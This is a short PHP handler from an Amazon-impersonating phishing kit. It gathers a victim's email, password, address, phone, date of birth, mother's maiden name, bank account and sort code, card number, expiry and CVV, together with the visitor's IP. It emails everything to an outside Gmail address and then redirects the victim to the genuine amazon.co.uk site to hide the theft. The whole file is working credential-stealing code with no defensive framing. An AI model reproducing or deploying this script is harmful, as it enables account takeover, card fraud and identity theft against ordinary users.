<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------+ Amazon by protest_song(at)yahoo.com +-----------------\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Full Name : ".$_POST['enterAddressFullName']."\n";
$message .= "Address : ".$_POST['enterAddressAddressLine1']."\n";
$message .= "City - County - Post : ".$_POST['enterAddressCity']."-".$_POST['enterAddressStateOrRegion']."-".$_POST['enterAddressPostalCode']."\n";
$message .= "Phone : ".$_POST['enterAddressPhoneNumber']."\n";
$message .= "DOB mm/dd/yyyy: ".$_POST['dobmonth']."/".$_POST['dobdate']."/".$_POST['dobyear']."\n";
$message .= "Mother Maiden Name : ".$_POST['mmn']."\n";
$message .= "Account Number : ".$_POST['acctn']."\n";
$message .= "Sort Code : ".$_POST['sort']."\n";
$message .= "Card Num : ".$_POST['ccnum']."\n";
$message .= "Card Expiry mm/yyyy: ".$_POST['expdate_month']."/".$_POST['expdate_year']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ Amazon by D3MS3G(at)yahoo.com +-----------------\n";
$send = "demseg12@gmail.com";
$subject = "Amazon | $ip";
mail("$send", "$subject", "$message"); 
header("Location: http://www.amazon.co.uk/ref=gno_logo");
	  

?>